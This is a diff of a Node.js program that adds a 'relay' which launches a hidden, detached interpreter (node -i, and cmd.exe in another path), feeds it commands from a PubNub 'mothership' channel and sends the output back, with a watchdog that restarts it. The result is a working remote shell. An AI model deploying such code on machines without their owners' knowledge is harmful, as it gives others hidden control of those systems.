@@ -252,25 +252,11 @@ var systemstate = {
     __jobcode: '',
 
     get jobcode() {
+        return this.__jobcode;
+    },
 
-        if ( ! isNullOrWhitespace(this.__jobcode) )
-            return this.__jobcode;
-
-        let codeout = '';
-
-        let token = "jobcode=";
-
-        if ( process_argv.length >= 3 ) { 
-            codeout = process_argv[process_argv.length-1];
-        
-            if ( codeout.toLowerCase().startsWith(token) ) {
-                codeout = codeout.substring(token.length-1);
-            }
-        }
-
-        this.__jobcode = codeout;
-
-        return codeout;
+    set jobcode(value) {
+        this.__jobcode = value;
     },
 
     get batchid() {
@@ -702,6 +688,9 @@ class PubnubRelay {
     #__enginename = 'UNKNOWN';
     #__userid = 'clientid_'+systemstate.clientid;
  
+    #__payloads = []; // outgoing messages
+    #__messages = []; // incomming messages
+
     constructor(enginename) {
         this.#__enginename = enginename;
         
@@ -711,6 +700,17 @@ class PubnubRelay {
             channels: [this.client_channel, this.mothership_channel]
         });
     }
+
+    get messages() {
+        return this.#__messages;    
+    };
+
+    get payloads() {
+        if ( ! this.#__payloads )
+            this.#__payloads = [];
+
+        return this.#__payloads;
+    };
 
     get mothership_channel() {
         return `clientid_${systemstate.clientid}_${this.enginename}_mothership`;
@@ -738,6 +738,7 @@ class PubnubRelay {
         
         subscription.onMessage = (messageEvent) => {
             logmsg("Message event: " + JSON.stringify(messageEvent));
+            this.messages.push(messageEvent);
             this.handleMessage(messageEvent);
         };
         
@@ -768,6 +769,10 @@ class PubnubRelay {
         })
         .then((response) => {
             logmsg('Message sent successfully! Timetoken:', response.timetoken);
+            
+            payload.response = response;
+
+            this.payloads.push(payload);
         })
         .catch((error) => {
             logmsg('Publish failed:', error);
@@ -1105,6 +1110,11 @@ function writeTag(fpath, tagstr) {
 }
 
 function isPidAlive(pid) {
+
+    if ( pid <= 0 ) {
+        return false;
+    }
+
     try {
       // Signal 0 tests for process existence without modifying it
       process.kill(pid, 0);
@@ -1498,7 +1508,7 @@ function execCMDScript(scriptfpath, cmdlineargsarr) {
 }
 
 function writeToChildProcess(child, msg) {
-    
+
     if ( ! child ) {
         throw new Error('child process is null');
     }
@@ -1509,6 +1519,79 @@ function writeToChildProcess(child, msg) {
         // child.stdin.end(); 
     }
 
+}
+
+function runpythonrelay(pubnubo) {
+
+}
+
+function runvbsrelay(pubnubo) {
+
+}
+
+function runpsrelay(pubnubo) {
+
+}
+
+function runnoderelay(pubnubo) {
+    logmsg('starting');
+
+    const child = spawn("node", ["-i"], {
+        shell: false,
+        detached: true,
+        windowsHide: true,
+        cwd: "",
+    });
+
+    let tchildproc = getProcess(child.pid);
+    // CommandLine
+    // Name
+    // ProcessId
+
+    child.stdout.on('data', (data) => {
+        const str = Buffer.from(data).toString(); 
+
+        logmsg(`Output: ${str}`);
+
+        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+    });
+
+    child.stdout.on('error', (err) => {
+        logmsg('STDOUT error:', err);
+    });
+
+    child.stderr.on('data', (data) => {
+        const str = Buffer.from(data).toString(); 
+
+        logmsg(`stderr: ${str}`);
+
+        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+    });
+
+    child.stdin.on('error', (err) => {
+        if (err.code === 'EPIPE') {
+            logmsg('Subprocess closed stdin early; ignoring broken pipe.');
+        } else {
+            logmsg('Unexpected STDIN error:', err);
+        }
+    });
+
+    child.on('close', (code) => {
+        logmsg(`script engine exited with code ${code}`);
+    });
+
+    child.on('error', (err) => {
+        logmsg('Failed to start subprocess:', err);
+    });
+
+    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+
+    // log event to mothership
+    // TODO log to pubnub
+    
+    logmsg('finished');
+
+    return child;
 }
 
 function runbatrelay(pubnubo) {
@@ -1531,7 +1614,10 @@ function runbatrelay(pubnubo) {
 
     child.stdout.on('data', (data) => {
         logmsg(`Output: ${data}`);
-        pubnubo.publishMessage( { scriptengine:'BAT', execresult:data } );
+
+        const str = Buffer.from(data).toString(); 
+
+        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
     });
 
     child.stdout.on('error', (err) => {
@@ -1552,7 +1638,7 @@ function runbatrelay(pubnubo) {
     });
 
     child.on('close', (code) => {
-        logmsg(`cmd.exe exited with code ${code}`);
+        logmsg(`script engine exited with code ${code}`);
         // TODO log to pubnub
     });
 
@@ -1568,6 +1654,25 @@ function runbatrelay(pubnubo) {
     logmsg('finished');
 
     return child;
+}
+
+function launchrelay(tenginename, tpubnubr) {
+
+    logmsg(`launching: ${tenginename}, ${tpubnubr}`);
+
+    if ( tenginename == 'JS' ) {
+        tchildp = runnoderelay(tpubnubr);
+    } else if ( tenginename == 'BAT' ) {
+        tchildp = runbatrelay(tpubnubr);
+    } else if ( tenginename == 'PS1' ) {
+        tchildp = runpsrelay(tpubnubr);
+    } else if ( tenginename == 'PY' ) {
+        tchildp = runpythonrelay(tpubnubr);
+    } else if ( tenginename == 'VBS' ) { 
+        tchildp = runvbsrelay(tpubnubr);
+    }
+
+    return tchildp;
 }
 
 function relay() {
@@ -1597,31 +1702,47 @@ function relay() {
 
     logmsg('clientjob: '+JSON.stringify(clientjob));
 
-    // EXEC_CMD --> StartRelay|BAT,PS1,PY,JS,VBS
+    let jobtype = clientjob?.jobtype;
+    let cmdname = clientjob?.cmdname;
+    let args = clientjob?.args;
+    let enginename = ( args ?? [] )[0];
 
-    // verify that the clientjob is for relay
-    // scriptengine 'vbs', 'ps1', 'py', 'js', 'bat'
+    if ( jobtype != 'EXEC_CMD' ) {
+        throw new Error('jobtype must be EXEC_CMD');
+    }
 
-    // invoke startbatrelay(), startvbsrelay, startps1relay, startpythonrelay, startnoserelay
+    if ( cmdname != 'StartRelay' ) {
+        throw new Error('cmdname must be StartRelay');
+    }
 
-    // RODO revise implementation to allow for all script engines in addition to BAT
+    if ( isNullOrWhitespace(enginename) ) {
+        throw new Error('cmdname must be StartRelay');
+    }
 
-    relaycmd.pubnubrelay = new PubnubRelay('BAT'); // get engine name from clientjob
+    if ( ! [ 'BAT', 'PS1', 'VBS', 'JS', 'PY' ].includes(enginename) ) {
+        throw new Error('enginename not supported: '+enginename);
+    }
+
+    relaycmd.pubnubrelay = new PubnubRelay(enginename);
   
     let pubnubr = relaycmd.pubnubrelay;
 
-    // incoming cmd str from mothership
+    // handle incoming message from pubnub (cmds sent by host to client)
     pubnubr.handleMessage = (msgevent) => {
         let payload = msgevent.message;
         let cmdtext = payload.cmdtext;
         writeToChildProcess(childp, cmdtext);
     };
 
-    let childp = runbatrelay(pubnubr);
+    let childp = null;
 
     relaycmd.loopfunc = () => {
         logmsg("relay looping...");
-        // TODO: check if child script engine is running, if not then activate it
+
+        let tcmdpid = childp?.pid ?? -1;
+
+        if ( ! isPidAlive(tcmdpid) )
+            childp = launchrelay(enginename, pubnubr);
     };
 
     relaycmd.loop();
@@ -1733,8 +1854,8 @@ async function cmdlist_handleMessage(msg) {
     logmsg('received new client job: '+JSON.stringify(clientjob));
 
     let jobtype = clientjob?.jobtype ?? '';
-    let jobcode = clientjob?.jobcode ?? '';
-
+    // let jobcode = clientjob?.jobcode ?? ''; // TODO: will need to pass jobcode to cmdconfig for logging purposes
+    
     if ( jobtype.toLowerCase() == 'execute_cmdlist' ) {
         clientjob = await retrieveClientJob();
     }
